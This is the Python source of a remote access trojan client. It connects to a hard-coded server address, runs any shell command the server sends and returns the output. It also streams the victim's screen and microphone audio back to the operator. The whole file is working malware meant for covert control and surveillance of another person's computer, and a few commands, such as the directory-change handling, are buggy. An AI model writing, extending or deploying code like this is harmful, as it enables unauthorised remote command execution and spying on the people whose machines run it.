import socket
import config
import vidstream
import subprocess
import os


class Commands:
    def __init__(self,connection:socket.socket,host:str,port:int) -> None:
        """Runs commands, automatically handles the output from the commands"""

        self.connection = connection
        self.host = host
        self.port = port

        self.vid_server = vidstream.ScreenShareClient(self.host, config.STREAM_PORT)
        self.audio_server = vidstream.AudioSender(self.host, config.AUDIO_PORT)

    def shell(self, command:str):
        """Runs a cmd from the client"""
        try:
            cmd = command[len("shell "): ]
            out = subprocess.run(cmd, capture_output=True, text=True, shell=True)
            if len(out.stdout) > 1:
                self.connection.send(out.stdout.encode())
                print(f"[SHELL] success")
            else:
                print(f"[SHELL] error")
                self.connection.send(out.stderr.encode())

        except subprocess.CalledProcessError as e:
            self.connection.send(e.stderr)

    def screenshare(self):
        """Starts screensharing"""
        self.vid_server.start_stream()
        self.audio_server.start_stream()
        self.connection.send("[*] started screensharing".encode())

    def stop_screen_share(self):
        """Stops screensharing"""
        self.vid_server.stop_stream()
        self.audio_server.stop_stream()
        self.connection.send("[*] stopped screensharing".encode())



class RatClient:
    def __init__(self,host:str, port:int) -> None:
        self.host = host
        self.port = port
        self.isrunning = False
        
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.command_manager = Commands(self.connection, self.host, self.port)

        self.current_directory = os.getcwd()

    def connect(self):
        """Connects to the server"""
        try:
            print(f"[*] Attemping to connect...")
            self.connection.connect((self.host, self.port))
            print(f"[*] Connection successful")
            self.isrunning = True

            self.handle_connection()
        except Exception as e:
            print(f"[!] Something happened connecting \n{e}\n")

    def stop(self):
        print("[*] Closing connection")
        self.connection.close()
    

    def handle_connection(self):
        """Handles the connection for the server"""

        while True:
            data = self.connection.recv(1024).decode()
            data_first = data.split(" ")[0].strip().lower()
            print(f"Recieved -> {data}")

            # Massive if statements :0

            if data == "exit":
                self.stop()
                break

            elif data_first == "shell":
                self.command_manager.shell(data)

            elif data_first == "screenshare":
                self.command_manager.screenshare()
            
            elif data_first == "stopscreenshare":
                self.command_manager.stop_screen_share()

            elif data_first == "pwd":
                print("CURRENT DIRECTORY")
                self.connection.send(os.getcwd())

            elif data_first == "cd ..":
                self.current_directory = os.path.dirname(self.current_directory)

            else:
                self.connection.send(f"Unkown command {data}".encode())

if __name__ == "__main__":
    rc = RatClient("192.168.0.11",config.PORT)
    rc.connect()